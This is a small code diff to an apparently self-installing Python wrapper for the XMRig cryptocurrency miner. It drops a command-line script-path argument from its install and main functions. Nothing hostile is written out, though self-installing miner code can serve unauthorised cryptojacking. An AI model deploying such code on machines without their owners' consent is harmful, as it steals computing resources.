@@ -64,7 +64,7 @@ async def calculate_file_hash(file_path: str) -> str:
 
 
 @log_decorator
-async def install_self(exec_script_path: str) -> bool:
+async def install_self() -> bool:
     try:
         current_hash = await calculate_file_hash(SCRIPT_PATH)
         if current_hash is None:
@@ -168,9 +168,9 @@ async def run_xmrig_command(command: str) -> int:
 
 
 @log_decorator
-async def main(exec_script_path: str):
+async def main():
     try:
-        if await install_self(exec_script_path):
+        if await install_self():
             logging.info(
                 "\033[93mExiting after installation. Please restart the script manually.\033[0m"
             )
@@ -211,8 +211,5 @@ async def main(exec_script_path: str):
 
 
 if __name__ == "__main__":
-    if len(sys.argv) != 2:
-        logging.error("\033[91mUsage: myne.py <exec_script_path>\033[0m")
-        sys.exit(1)
-    exec_script_path = sys.argv[1]
-    asyncio.run(main(exec_script_path))
+    asyncio.run(main())
+
